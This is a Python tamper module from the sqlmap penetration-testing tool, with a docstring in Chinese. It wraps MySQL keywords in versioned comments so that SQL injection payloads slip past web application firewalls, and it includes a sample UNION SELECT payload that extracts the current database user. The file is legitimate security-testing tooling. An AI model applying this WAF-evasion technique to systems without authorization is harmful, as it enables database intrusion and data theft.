#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ = PRIORITY.HIGHER

def dependencies():
    singleTimeWarnMessage('篡改脚本“%s”仅适用于 %s >= 5.1.13' % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    "\n    用 (MySQL) 版本注释括住每个关键字\n\n    Requirement:\n        * MySQL >= 5.1.13\n\n    测试针对：\n        * MySQL 5.1.56, 5.5.11\n\n    Notes:\n        * 有助于绕过多个 Web 应用程序防火墙\n          后台数据库管理系统为MySQL\n\n    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')\n    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'\n    "

    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!%s*/" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, retVal)
        retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

    return retVal
